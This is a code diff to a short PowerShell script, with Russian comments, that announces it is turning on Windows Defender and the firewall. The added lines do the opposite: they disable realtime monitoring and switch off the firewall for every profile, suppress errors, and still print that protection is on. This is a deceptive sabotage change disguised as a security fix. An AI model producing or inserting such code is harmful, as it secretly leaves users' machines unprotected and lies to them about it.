@@ -3,14 +3,14 @@ Write-Host "Turning On Windows Defender..." -ForegroundColor Cyan
 
 try {
     # Убираем отключение realtime protection
-    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
     # Включаем службу Defender
     Set-Service -Name WinDefend -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name WinDefend -ErrorAction SilentlyContinue
 
     # Включаем firewall
-    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction SilentlyContinue
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
 
     Write-Host "Ready. Windows Defender and Firewall turned On." -ForegroundColor Green
 }
